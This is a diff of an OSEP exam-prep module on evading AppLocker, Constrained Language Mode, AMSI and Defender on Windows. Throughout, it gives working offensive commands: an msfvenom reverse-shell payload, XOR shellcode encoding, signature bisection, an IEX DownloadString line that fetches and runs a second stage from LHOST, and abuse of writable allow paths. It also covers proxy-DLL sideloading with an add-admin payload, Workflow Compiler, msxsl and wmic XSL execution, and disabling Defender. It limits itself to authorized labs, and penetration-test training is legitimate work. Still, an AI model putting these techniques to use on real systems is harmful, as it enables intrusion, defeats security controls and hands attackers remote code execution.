@@ -2,63 +2,42 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 05 · AppLocker / CLM / AMSI bypass and trusted hosts
+# AppLocker, CLM, and AMSI
 
-> **Covers scenarios:** 18, 19, 20, 21, 22, 23, 24
->
-> **Course mapping:** Chapter 11 (AV evasion), Chapter 13 (AppLocker / CLM bypass), Chapters 8–9 (managed assembly load)
->
-> **Prerequisites:** an entry that can execute code (macro / HTA / JScript / Web); target has Defender + possibly AppLocker and CLM; attacker box can compile C#/C
+First decide whether what was blocked is the loader or the execution content. Loader kills need static-signature and host-shape changes; execution blocks need behavior and staging changes. After a block, don't keep rewriting encoding if the real problem is behavior.
 
-**Rules for this module**: first **decide whether what was blocked is the “loader” or the “execution content”**. Fixes for those two failure classes are completely different — loader kills need static-signature and host-shape changes; execution blocks need behavior and staging changes. The most common exam mistake: after a block, keep rewriting static encoding when the real problem is behavior.
+## Custom EXE is deleted as soon as it lands
 
----
+If a harmless program can be saved and run, but your Runner is quarantined before it starts, on-disk static signatures were hit — not execution behavior.
 
-## Scenario 18: Custom EXE is deleted as soon as it lands
+- [ ] Deliver a harmless control first (`hello.c` that only prints `ok`)
+- [ ] Deliver a custom Runner with no payload (only prints); watch whether it is deleted
+- [ ] If deleted, bisect the signature, then switch to encoded/encrypted shellcode
+- [ ] If it lands but never callbacks, go to the next section (behavioral detection)
+- [ ] Still deleted after re-encoding → change host shape (InstallUtil / managed load / allow paths)
 
-**Situation**: The target allows file upload, but your prepared Runner is quarantined before it starts; a simple harmless program can be saved and run. → That means **on-disk static signatures** were hit, not execution behavior.
+Establish the control and encode shellcode:
 
-**Assumptions**:
-- You already have a file delivery channel (HTTP/SMB/Web upload).
-- You can observe “file disappears” or “process never created”.
-- Attacker box can compile a custom Runner (mingw-w64 / csc).
+```bash
+x86_64-w64-mingw32-gcc -o hello-x64.exe hello.c -s -O2   # only printf("ok")
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o sc.bin
+python3 m13-xor-encoder.py sc.bin --format c   # emit C array + key
+```
 
-**Prepare (attacker side)**:
+Compile a custom C# Runner (avoid msfvenom templates to reduce shared signatures):
 
-1. Establish a control baseline — deliver a harmless program first to confirm delivery and execution themselves are fine:
-   ```bash
-   x86_64-w64-mingw32-gcc -o hello-x64.exe hello.c -s -O2   # only printf("ok")
-   ```
-2. Prepare encoded/encrypted shellcode (XOR is simplest and most stable):
-   ```bash
-   msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o sc.bin
-   python3 m13-xor-encoder.py sc.bin --format c   # emit C array + key
-   ```
-3. Prepare a custom C# Runner (avoid msfvenom templates to reduce shared signatures):
-   ```bash
-   # Compile on target (if csc is available)
-   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
-   ```
+```bash
+# Compile on target (if csc is available)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
+```
 
-**Procedure**:
+After delivery, `dir` confirms the file exists; after run, `tasklist` confirms the process; the listener confirms the callback. Missing any of the three means re-locate the failure.
 
-1. Deliver the harmless program; confirm it lands and runs → proves the delivery channel works.
-2. Deliver the custom Runner (no payload yet — only prints); watch whether it is deleted:
-   - Deleted → loader static-signature problem → step 3.
-   - Not deleted but no callback → scenario 19 (behavioral detection).
-3. Locate the signature: split the Runner into sections, replace each with harmless code, binary-search the hit string/API combo. Common hits: `VirtualAlloc` + `CreateThread` together, plaintext `meterpreter`, common msfvenom template byte sequences.
-4. Switch to encoded/encrypted form: embed shellcode as a ciphertext array; XOR-decrypt in memory at runtime; split strings into pieces and concatenate.
-5. Change host shape: do not land a standalone EXE — use InstallUtil assemblies / managed assembly load / PowerShell reflection (see scenarios 20, 23).
+Locate the signature by splitting the Runner into sections, replacing each with harmless code, and binary-searching the hit string/API combo. Common hits: `VirtualAlloc` + `CreateThread` together, plaintext `meterpreter`, common msfvenom template byte sequences. Then embed shellcode as a ciphertext array, XOR-decrypt in memory at runtime, and split strings into pieces.
 
-**Scripts used**:
-| File | Purpose | Key parameters |
-|---|---|---|
-| `m13-xor-encoder.py` | Emit XOR-encoded C arrays | `sc.bin --format c` |
-| `m01-shellcode-runner-x64.cs` | Custom C# Runner (with XOR decrypt) | Replace ciphertext array and key |
-| `m05-amsi-bypass-variants.ps1` | AMSI handling for PowerShell paths | See notes inside the script |
+If it is still deleted after re-encoding, the loader itself is signatured — switch to trusted hosts (InstallUtil / Workflow / XSL, later in this module) or managed assembly load. If the file lands but Defender alerts, disable realtime protection (if you already have admin) or switch to in-memory execution with no disk drop. If the target forbids any unsigned EXE, abandon the EXE path; use AppLocker allow paths or a DLL. Always run a harmless control first, or you cannot tell "delivery failed" from "killed." Change one variable per try; don't repeatedly deliver the same signatured file to the same host.
 
-
-#### `m13-xor-encoder.py`
+::: details `m13-xor-encoder.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -167,7 +146,9 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m01-shellcode-runner-x64.cs`
+:::
+
+::: details `m01-shellcode-runner-x64.cs` · click to expand
 
 ````csharp
 // Purpose: custom x64 shellcode Runner (precompile to avoid Add-Type dynamic compile landing temp files)
@@ -251,7 +232,9 @@ class Runner
 }
 ````
 
-#### `m05-amsi-bypass-variants.ps1`
+:::
+
+::: details `m05-amsi-bypass-variants.ps1` · click to expand
 
 ````powershell
 <#
@@ -381,27 +364,20 @@ if ($ProbeOnly) {
 }
 ````
 
-**Validation**: after delivery, `dir` confirms the file exists; after run, `tasklist` confirms the process; listener confirms the callback. Missing any of the three means re-locate the failure.
+:::
 
-**Failure branches and alternatives**:
-1. Still deleted after re-encoding → the loader itself is signatured → switch to trusted hosts (InstallUtil / Workflow / XSL, scenarios 23, 24) or managed assembly load (scenario 20).
-2. File lands but Defender alerts → disable realtime protection (if you already have admin — see `Defense Evasion` → Disable Defender), or switch to in-memory execution with no disk drop.
-3. Target forbids any unsigned EXE → abandon the EXE path; use AppLocker allow paths (scenario 21) or DLL (scenario 22).
 
-**Exam / OPSEC notes**: always run a harmless control first, or you cannot tell “delivery failed” from “killed”; change one variable per try and record it; do not repeatedly deliver the same signatured file to the same host (may trigger more aggressive blocking).
+## EXE starts, then is killed when execution begins
 
----
+If the file lands and early startup looks normal, but the process dies once later execution or communication starts, that is behavioral detection — not a static kill.
 
-## Scenario 19: EXE saves and starts, but is killed when execution content begins
+- [ ] Confirm the previous section's control still lands and starts
+- [ ] Deliver sample A (in-process decrypt and run); note whether it dies at alloc, thread create, or network connect
+- [ ] If killed at injection APIs, switch to sample B (cross-process) or C (hollowing), or load a managed assembly
+- [ ] If killed at communication, the problem is the C2 channel (module 09) — not injection
+- [ ] Record each sample's kill point
 
-**Situation**: File lands fine and early startup looks normal; once later execution or communication starts, the process is terminated. → This is **behavioral detection**, not static kill.
-
-**Assumptions**:
-- Scenario 18 control already proved the file can land and start.
-- Target has behavioral monitoring (Defender Behavior Monitor / EDR rules).
-- You can generate multiple execution implementations for comparison.
-
-**Prepare (attacker side)**: prepare three control samples
+Prepare three control samples. After generate, first validate behavior with a harmless payload (calc or write a file), then swap the real payload:
 
 | Sample | Implementation | Watch point |
 |---|---|---|
@@ -414,21 +390,11 @@ if ($ProbeOnly) {
 # After generate, first validate behavior with a harmless payload (calc or write a file), then swap the real payload
 ```
 
-**Procedure**:
-1. Deliver A (in-process); observe the kill point: at alloc, at thread create, or at network connect.
-2. If killed at the **communication stage** → problem is the C2 channel, not injection (go to [09-c2-egress-channels](/modules/09-c2-egress-channels)).
-3. If killed at **injection APIs** → switch to B / C, or load a managed assembly (`Assembly.Load`, avoid explicit `VirtualAlloc`).
-4. If killed at **post-decrypt execution** → change payload shape (staged, smaller shellcode, HTTP instead of TCP callback).
-5. Record each sample’s kill point into a “behavior—block” table (valuable in the exam report).
+If killed at **post-decrypt execution**, change payload shape (staged, smaller shellcode, HTTP instead of TCP callback). If all three injection implementations are blocked, switch to a trusted host or a managed assembly. If only a specific payload is blocked, change the payload, not the injection method.
 
-**Scripts used**:
-| File | Purpose | Key parameters |
-|---|---|---|
-| `m01-shellcode-runner-x64.cs` | In-process exec (sample A) | Swap payload and key |
-| `m05-clm-bypass-runspace.ps1` | Managed in-memory exec fallback | See script |
-| `m05-amsi-bypass-variants.ps1` | AMSI handling for script paths | See script |
+Validation: the process survives until it initiates a network connect; the listener receives the connection; `Get-MpThreatDetection` for alert records. Behavioral detection triggers on "difference" — don't try many injection methods back-to-back in the same process; space attempts apart, and after failure confirm whether the process is already marked.
 
-#### `m05-clm-bypass-runspace.ps1`
+::: details `m05-clm-bypass-runspace.ps1` · click to expand
 
 ````powershell
 <#
@@ -517,55 +483,34 @@ Write-Output "    2) reflective assembly load: . .\m01-reflective-runner.ps1 -Pa
 Write-Output "    3) download-exec second stage: IEX (New-Object Net.WebClient).DownloadString('http://LHOST/stage2.ps1')"
 ````
 
-**Validation**: process survives until it initiates a network connect; listener receives the connection; `Get-MpThreatDetection` for alert records.
+:::
 
-**Failure branches and alternatives**:
-1. All three injection implementations blocked → switch to trusted-host load (scenarios 23, 24), or managed assemblies (scenario 20).
-2. Only blocked when initiating outbound → use proxy/DNS/domain fronting (`docs/09`).
-3. Only a specific payload is blocked → change the payload, not the injection method.
 
-**Exam / OPSEC notes**: behavioral detection triggers on “difference”; do not try many injection methods back-to-back in the same process; space attempts apart, and after failure confirm whether the process is already marked.
+## Need a managed tool, but its EXE cannot land
 
----
+If you already have a host that can run .NET code, but a .NET tool cannot land and run as an EXE, load its assembly inside the existing host — native EXE and managed assembly are not the same thing.
 
-## Scenario 20: You need a managed tool, but its EXE cannot land and run
+- [ ] Confirm the target is a managed assembly
+- [ ] `Assembly.Load` the bytes and reflectively call the entry — do not land/run the EXE
+- [ ] Resolve dependency assemblies (same directory, or `AppDomain.AssemblyResolve`)
+- [ ] Capture console/file output from the reflective call
 
-**Situation**: You already have a host that can execute managed logic; a .NET tool cannot land and run as an EXE, but its assembly form can be loaded inside the existing host. → **Native EXE ≠ managed assembly** — change the load method.
+Confirm and load:
 
-**Assumptions**:
-- You already have a host that can run .NET code (PowerShell, custom C# host, .NET calls from an Office macro).
-- The target tool is a managed assembly (.NET DLL) or a byte stream `Assembly.Load` can load.
-- Its EXE cannot be run directly (AppLocker / AV / rights limits).
-
-**Prepare (attacker side)**:
-```bash
-# Obtain the tool’s managed assembly (DLL); extract from the EXE as an assembly if needed
-# Locally you can compile a test assembly with mcs / dotnet
+```powershell
+[Reflection.AssemblyName]::GetAssemblyName("C:\path\tool.dll").FullName
+$bytes = [IO.File]::ReadAllBytes("C:\path\tool.dll")
+$asm = [Reflection.Assembly]::Load($bytes)
+$asm.GetTypes() | Where-Object { $_.IsPublic } | Select-Object FullName
+# After finding the entry type, call its static method; adapt args to the tool
+$t = $asm.GetType("Tool.Program"); $t.GetMethod("Main").Invoke($null, @([string[]]@("arg1","arg2")))
 ```
 
-**Procedure**:
-1. Confirm the target is a managed assembly:
-   ```powershell
-   [Reflection.AssemblyName]::GetAssemblyName("C:\path\tool.dll").FullName
-   ```
-2. Load and reflectively call the entry (do not land/run the EXE):
-   ```powershell
-   $bytes = [IO.File]::ReadAllBytes("C:\path\tool.dll")
-   $asm = [Reflection.Assembly]::Load($bytes)
-   $asm.GetTypes() | Where-Object { $_.IsPublic } | Select-Object FullName
-   # After finding the entry type, call its static method; adapt args to the tool
-   $t = $asm.GetType("Tool.Program"); $t.GetMethod("Main").Invoke($null, @([string[]]@("arg1","arg2")))
-   ```
-3. Dependency handling: put dependency assemblies in the same directory, or resolve from memory via `AppDomain.AssemblyResolve`.
-4. Output adaptation: tools that wrote console/files need return-value capture or output redirect under reflective call.
+Validation: `$asm.FullName` returns successfully; the reflective call returns expected results; no on-disk files produced.
 
-**Scripts used**:
-| File | Purpose | Key parameters |
-|---|---|---|
-| `m05-installutil-runner.cs` | Managed assembly loader template | Replace assembly path/entry |
-| `m01-reflective-runner.ps1` | PowerShell reflective load | Replace DLL path and args |
+If the tool is a native (unmanaged) EXE, it cannot be reflectively loaded — use InstallUtil / another host, or find a managed equivalent. If `Assembly.Load` is blocked by AMSI/CLM, handle AMSI and the Runspace bypass first (`m05-amsi-bypass-variants.ps1`, `m05-clm-bypass-runspace.ps1`), then load. If dependencies are missing, resolve in memory via `AssemblyResolve`, or add the dependency directory to `AppDomain.BaseDirectory`. Args must strictly match the tool entry — validate the call signature locally before the exam. Reflective calls create no new process, so the log surface is smaller.
 
-#### `m05-installutil-runner.cs`
+::: details `m05-installutil-runner.cs` · click to expand
 
 ````csharp
 // Purpose: InstallUtil-compatible managed Runner — a .NET installer class InstallUtil.exe can invoke,
@@ -674,7 +619,9 @@ public class Runner : Installer
 }
 ````
 
-#### `m01-reflective-runner.ps1`
+:::
+
+::: details `m01-reflective-runner.ps1` · click to expand
 
 ````powershell
 <#
@@ -750,57 +697,46 @@ try {
 }
 ````
 
-**Validation**: `$asm.FullName` returns successfully; reflective call returns expected results; no on-disk files produced.
+:::
 
-**Failure branches and alternatives**:
-1. Tool is a native EXE (unmanaged) → cannot reflectively load → use InstallUtil/host (scenario 23) or find a managed equivalent.
-2. `Assembly.Load` blocked by AMSI/CLM → handle AMSI and Runspace bypass first (this module’s scripts), then load.
-3. Missing dependencies → resolve in memory via `AssemblyResolve`, or add the dependency directory to `AppDomain.BaseDirectory`.
 
-**Exam / OPSEC notes**: reflective calls create no new process — smaller log surface; but args must strictly match the tool entry; validate the call signature locally before the exam.
+## EXE refused, but some directories are allowed
 
----
+If a normal-user session cannot start uploaded programs from the current directory, enumerate effective AppLocker rules and look for an allow path the current user can write.
 
-## Scenario 21: Ordinary EXE refused by AppLocker, but some directories have allow rules
+- [ ] Enumerate effective policy (`m05-applocker-enum.ps1`)
+- [ ] Extract allow paths and check write rights on each candidate
+- [ ] Deliver the payload to an allowed + writable directory and execute from there
 
-**Situation**: You have a normal-user session; uploaded programs cannot run from the current directory; effective policy allows certain paths, some of which the current user can write.
+Under default AppLocker EXE rules, all users may run executables under `C:\Windows`, `C:\Program Files`, and `C:\Program Files (x86)` recursively; administrators are exempt. User-profile paths are not allowed unless a custom rule exists — the useful case is a writable subdirectory of `%WINDIR%` (commonly `C:\Windows\Tasks`).
 
-**Assumptions**:
-- AppLocker EXE rule set is enforced; default paths (e.g. `C:\Users\Public`) are denied.
-- Policy has allow directories (common: `C:\Windows\Tasks`, `C:\Windows\Temp`, some dirs under the user profile).
-- Current user has write rights on those directories.
+Enumerate:
 
-**Prepare (attacker side)**: no special prep — enumerate with the script.
+```powershell
+Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml
+# or
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 
-**Procedure**:
-1. Enumerate effective policy (under CLM, XML parse may fail — script falls back):
-   ```powershell
-   Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml
-   # or
-   Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
-   ```
-2. Extract allow paths:
-   ```powershell
-   (Get-AppLockerPolicy -Effective).RuleCollections |
-     Where-Object CollectionType -eq 'Exe' |
-     ForEach-Object { $_.GetRules() } |
-     Where-Object Action -eq 'Allow' |
-     Select-Object -ExpandProperty Conditions
-   ```
-3. Check write rights on each candidate directory:
-   ```powershell
-   icacls "C:\Windows\Tasks"
-   # or
-   accesschk.exe -w "C:\Windows\Tasks" -accepteula
-   ```
-4. Deliver the payload to an “allowed + writable” directory and execute from there.
+(Get-AppLockerPolicy -Effective).RuleCollections |
+  Where-Object CollectionType -eq 'Exe' |
+  ForEach-Object { $_.GetRules() } |
+  Where-Object Action -eq 'Allow' |
+  Select-Object -ExpandProperty Conditions
+```
 
-**Scripts used**:
-| File | Purpose | Key parameters |
-|---|---|---|
-| `m05-applocker-enum.ps1` | Enumerate effective rules + writable allow paths | `-PayloadPath` optional |
+Check write rights:
 
-#### `m05-applocker-enum.ps1`
+```powershell
+icacls "C:\Windows\Tasks"
+# or
+accesschk.exe -w "C:\Windows\Tasks" -accepteula
+```
+
+From the target directory run `cmd /c whoami` or your payload and confirm policy no longer blocks; keep `Test-Path` and `icacls` output on record.
+
+If there is no writable allow directory, switch to a DLL path or a trusted host. If policy parse is limited by CLM, write `Get-AppLockerPolicy -Effective -Xml` to disk and parse it offline, or brute-force common directories. If the allow directory exists but Defender blocks the payload, combine with the encoding path above. AppLocker limits where you start from, not everything about what you start. On older systems, if `-Effective` is unavailable, use `Get-AppLockerPolicy -Local` or read `%windir%\System32\AppLocker\*.xml` directly.
+
+::: details `m05-applocker-enum.ps1` · click to expand
 
 ````powershell
 <#
@@ -912,49 +848,36 @@ if ($writable.Count -gt 0) {
 Write-Both ("`nreport saved: {0}" -f $OutFile)
 ````
 
-**Validation**: from the target directory run `cmd /c whoami` or your payload and confirm policy no longer blocks; keep `Test-Path` and `icacls` output on record.
+:::
 
-**Failure branches and alternatives**:
-1. No writable allow directory → DLL path (scenario 22) or trusted hosts (scenarios 23, 24).
-2. Policy parse limited by CLM → `Get-AppLockerPolicy -Effective -Xml` to disk then parse offline, or brute-force common directories.
-3. Allow directory exists but Defender blocks the payload → combine with scenario 18 encoding.
 
-**Exam / OPSEC notes**: AppLocker only limits “where you start from”, not everything about “what you start”; confirm policy version first (`Get-AppLockerPolicy -Effective` needs Win10+); on older systems use `Get-AppLockerPolicy -Local` or read `%windir%\System32\AppLocker\*.xml` directly.
+## EXE rules are strict, DLL rules are not
 
----
+If a custom program cannot start directly, but an already-allowed application can load an external DLL and that load is not blocked, use a Proxy DLL — AppLocker DLL rules are off by default, but check policy first.
 
-## Scenario 22: EXE rules are strict, but DLL rules and host allow conditions differ
+- [ ] Confirm DLL rule-set status
+- [ ] Find an allowed host and its DLL search path (same directory first)
+- [ ] Place a full-forward Proxy on that path (exports and calling convention must match — module 04)
+- [ ] Start the host; confirm the payload runs and the host still works
 
-**Situation**: Ordinary custom programs cannot start directly, but an already-allowed application can load an external DLL, and that DLL load is not blocked by an effective rule.
+Confirm DLL rules, then build the Proxy:
 
-**Assumptions**:
-- AppLocker DLL rule set is off or loose (DLL rules are off by default).
-- There is an allowed host program that loads a DLL from a location you can influence.
+```powershell
+(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
+```
 
-**Prepare (attacker side)**:
+`Dll` type missing or `AuditOnly` → the DLL path is viable.
+
 ```bash
 # Proxy DLL idea: export full forward + run payload in DllMain
 x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def -s
 ```
 
-**Procedure**:
-1. Confirm DLL rule-set status:
-   ```powershell
-   (Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
-   ```
-   `Dll` type missing or AuditOnly → DLL path is viable.
-2. Find an allowed host and its DLL search path (same directory first).
-3. Place the DLL on the host’s search path; keep exports and calling convention matching the original DLL (see [04-dll-sideloading](/modules/04-dll-sideloading) scenario 12).
-4. Start the host; confirm the payload runs and the host still works.
+Validation: the host starts normally (no crash); the DLL payload executes; confirm with `whoami` or a callback.
 
-**Scripts used**:
-| File | Purpose | Key parameters |
-|---|---|---|
-| `m04-proxy-dll-sideload.c` | Full-forward Proxy DLL | Replace original DLL name |
-| `m04-proxy-dll-newadmin.c` | DLL payload (add admin / reverse) | LHOST/LPORT |
-| `m04-build-sideload-package.py` | Pack host + DLL | Host version, arch |
+If the DLL rule set is on and strict, switch to trusted hosts. If the host crashes, the export table or calling convention is mismatched (module 04). If the host does not load a same-directory DLL, find another sideload-capable host, or use a `PATH` hijack.
 
-#### `m04-proxy-dll-sideload.c`
+::: details `m04-proxy-dll-sideload.c` · click to expand
 
 ````c
 /*
@@ -1042,7 +965,9 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
  */
 ````
 
-#### `m04-proxy-dll-newadmin.c`
+:::
+
+::: details `m04-proxy-dll-newadmin.c` · click to expand
 
 ````c
 /*
@@ -1253,7 +1178,9 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
 }
 ````
 
-#### `m04-build-sideload-package.py`
+:::
+
+::: details `m04-build-sideload-package.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -1443,52 +1370,46 @@ if __name__ == "__main__":
     sys.exit(main(sys.argv[1:]))
 ````
 
-**Validation**: host starts normally (no crash); DLL payload executes; confirm with `whoami` or a callback.
+:::
 
-**Failure branches and alternatives**:
-1. DLL rule set on and strict → switch to trusted hosts (scenarios 23, 24).
-2. Host crashes → export table / calling convention mismatch (`docs/04` scenario 12).
-3. Host does not load same-directory DLL → find another sideload-capable host, or use `PATH` hijack.
 
-**Exam / OPSEC notes**: AppLocker DLL rules are off by default — one of the easiest exam paths; do not treat it as guaranteed — check policy first.
+## InstallUtil unavailable, other trusted hosts remain
 
----
+If InstallUtil is blocked or missing from the allow list, switch to `Microsoft.Workflow.Compiler.exe` — or another signed host still allowed by policy. Always use the full path; never rely on PATH (AppLocker matches by path).
 
-## Scenario 23: InstallUtil unavailable, but other trusted execution hosts from the course still work
+- [ ] Confirm the host exists
+- [ ] Craft a C# class that inherits `Activity` and has a constructor
+- [ ] Serialize a CompilerInput XML with `SerializeInputToWrapper`, then invoke the compiler
+- [ ] Confirm payload execution (callback or `results.xml` is created)
 
-**Situation**: The InstallUtil path is blocked by policy, but the target still has the Workflow compiler host and its required environment.
+The course path (PEN-300 §13.4) is **serialized CompilerInput XML + a C# `Activity` subclass**, not a raw XOML drop-in:
 
-**Assumptions**:
-- AppLocker blocks InstallUtil (or it was removed from the allow list).
-- `Microsoft.Workflow.Compiler.exe` exists and is runnable (.NET Framework 4.0 directory).
+```powershell
+Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
 
-**Prepare (attacker side)**:
-```bash
-# Build the Workflow input assembly (managed assembly with XOML logic)
-x86_64-w64-mingw32-gcc ...   # not needed — compile C# with csc.exe
-# On target:
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:payload.dll m05-workflow-compiler-runner.cs
+$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
+$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
+$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
+Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
+$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
+$compilerparam.GenerateInMemory = $True
+$pathvar = "test.txt"   # C# Activity subclass source
+$output = "C:\Tools\run.xml"
+$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
+Move-Item $tmp $output
 ```
 
-**Procedure**:
-1. Confirm the host exists:
-   ```powershell
-   Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
-   ```
-2. Prepare XOML + assembly (or use the assembly entry directly).
-3. Invoke:
-   ```cmd
-   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe payload.xoml output.xml
-   ```
-4. Confirm payload execution (callback / on-disk marker file).
+```cmd
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
+```
 
-**Scripts used**:
-| File | Purpose | Key parameters |
-|---|---|---|
-| `m05-workflow-compiler-runner.cs` | Workflow host input assembly | Replace payload logic |
-| `m05-lolbas-notes.md` | Trusted-host quick reference | — |
+<!-- VERIFY: m05-workflow-compiler-runner.cs is a static Runner (not an Activity subclass) and its header still shows `payload.xoml`. PEN-300 §13.4 uses serialized CompilerInput XML (`run.xml results.xml`) plus a C# class that inherits Activity and has a constructor. Keep the script as a payload sketch; wire it into an Activity (or re-test the header command) before exam use. -->
 
-#### `m05-workflow-compiler-runner.cs`
+If the Workflow host is also blocked, try XSL (next section), MSBuild, `regsvr32`, or `mshta`. If the .NET version directory is wrong, enumerate all `v*` under `C:\Windows\Microsoft.NET\Framework*`. If CLM affects PowerShell invocation, call the host via `cmd /c` directly, not through PowerShell. `InstallUtil` reporting "not a valid Win32 application" is usually bitness — switch to the `Framework` (32-bit) directory.
+
+Trusted hosts win because they are already on the allow list and you don't drop a custom EXE to launch. Selection order (most likely allowed, least obvious): loose DLL rules → writable allow directory → InstallUtil → Workflow Compiler → XSL (`msxsl`/`wmic`) → `regsvr32` / MSBuild.
+
+::: details `m05-workflow-compiler-runner.cs` · click to expand
 
 ````csharp
 // Purpose: Workflow Compiler trusted host — assembly loaded and run by Microsoft.Workflow.Compiler.exe
@@ -1557,7 +1478,9 @@ namespace Payload
 }
 ````
 
-#### `m05-lolbas-notes.md`
+:::
+
+::: details `m05-lolbas-notes.md` · click to expand
 
 ````markdown
 # Trusted-host quick reference (scenarios 21–24)
@@ -1624,45 +1547,32 @@ where mshta
 - Scenario flow: `docs/05-applocker-clm-amsi.md`
 ````
 
-**Validation**: command returns without error; listener gets a callback; `output.xml` is created (proves the host actually ran).
+:::
 
-**Failure branches and alternatives**:
-1. Workflow host also blocked → try XSL (scenario 24), MSBuild, `regsvr32` (script host), `mshta` (HTA path).
-2. Different .NET version directories → enumerate all `v*` under `C:\Windows\Microsoft.NET\Framework*`.
-3. CLM affects PowerShell invocation → call the host via `cmd /c` directly, not through PowerShell.
 
-**Exam / OPSEC notes**: trusted hosts win because they are “on the allow list + no custom EXE on disk”; always use full paths — never rely on PATH.
+## Normal script entry limited, XSL path still works
 
----
+If conventional script execution is restricted but the matching component can still process XSL that embeds script logic, and effective policy allows calling it, use `msxsl.exe` or `wmic /format`.
 
-## Scenario 24: Normal script entry is limited, but an XSL processing path still works
+- [ ] Confirm `msxsl.exe` or `wmic.exe` is present (`where wmic` / `where msxsl`)
+- [ ] Drop `m05-xsl-exec.xsl` (replace `LHOST`/URL) and trigger it
+- [ ] Confirm a callback or marker file, and that the `msxsl`/`wmic` process was actually created
 
-**Situation**: Conventional script execution is restricted, but the matching component can still process XSL that embeds script logic, and effective policy allows calling it.
+With `msxsl.exe` (if present):
 
-**Assumptions**:
-- PowerShell/VBScript entry is limited.
-- `msxsl.exe` or `wmic.exe` is available and can process XSL with embedded JScript/VBScript.
+```cmd
+msxsl.exe payload.xml payload.xsl
+```
 
-**Prepare (attacker side)**: write XSL containing `<msxsl:script language="JScript">`, or use the `wmic` format execution path.
+Or the `wmic` XSL format path:
 
-**Procedure**:
-1. With `msxsl.exe` (if present):
-   ```cmd
-   msxsl.exe payload.xml payload.xsl
-   ```
-2. Or the `wmic` XSL format path:
-   ```cmd
-   wmic process get brief /format:"C:\Windows\Temp\payload.xsl"
-   ```
-3. Put payload logic in the XSL script block (download-exec / callback).
+```cmd
+wmic process get brief /format:"C:\Windows\Temp\payload.xsl"
+```
 
-**Scripts used**:
-| File | Purpose | Key parameters |
-|---|---|---|
-| `m05-xsl-exec.xsl` | XSL script-exec template | Replace LHOST/URL |
-| `m05-lolbas-notes.md` | Host invocation quick reference | — |
+`msxsl.exe` is not inbox — bringing your own introduces a custom file, so watch AppLocker. `wmic` may be removed on Win11 24H2+; confirm with `where wmic` before the exam. If `msxsl.exe` is missing, use the `wmic` `/format` path. If the XSL script is scanned by AMSI, split/encode detected strings, or make XSL a downloader only and deliver stage two separately. If policy allows `wmic` but not `/format`, switch to the other trusted hosts above.
 
-#### `m05-xsl-exec.xsl`
+::: details `m05-xsl-exec.xsl` · click to expand
 
 ````xml
 <?xml version="1.0"?>
@@ -1710,41 +1620,23 @@ Test status: not runtime-tested on Windows; XML/XSL structure checked by hand
 </xsl:stylesheet>
 ````
 
-**Validation**: command has no error; callback or marker file appears; `msxsl`/`wmic` process is actually created.
+:::
 
-**Failure branches and alternatives**:
-1. `msxsl.exe` missing (not installed by default) → use the `wmic` `/format` path.
-2. XSL script scanned by AMSI → split/encode detected strings, or make XSL a downloader only and deliver stage two separately.
-3. Policy allows `wmic` but not `/format` → switch to other trusted hosts (scenario 23).
 
-**Exam / OPSEC notes**: `wmic` may be removed on newer systems (Win11 24H2+); confirm with `where wmic` before the exam; XSL’s advantage is that policy often ignores it.
+## Cheat sheet
 
----
-
-## Module quick reference
-
-| Symptom | Command / action |
+| You want to… | Use |
 |---|---|
-| Enumerate effective AppLocker policy | `Get-AppLockerPolicy -Effective -Xml` |
+| Enumerate effective AppLocker policy | `Get-AppLockerPolicy -Effective -Xml`, `m05-applocker-enum.ps1` |
 | Check language mode | `$ExecutionContext.SessionState.LanguageMode` |
-| Check Defender realtime protection | `Get-MpComputerStatus \| fl RealTimeProtectionEnabled` |
-| Check whether DLL rule set is enabled | `(Get-AppLockerPolicy -Effective).RuleCollections \| ? CollectionType -eq 'Dll'` |
+| Check Defender realtime | `Get-MpComputerStatus \| fl RealTimeProtectionEnabled` |
+| Check whether DLL rules are on | `(Get-AppLockerPolicy -Effective).RuleCollections \| ? CollectionType -eq 'Dll'` |
 | Check directory write rights | `icacls <dir>`, `accesschk -w <dir>` |
-| Trusted hosts | InstallUtil / Microsoft.Workflow.Compiler / msxsl / wmic / mshta / regsvr32 / MSBuild |
-| Managed assembly load | `[Reflection.Assembly]::Load($bytes)` + reflective entry call |
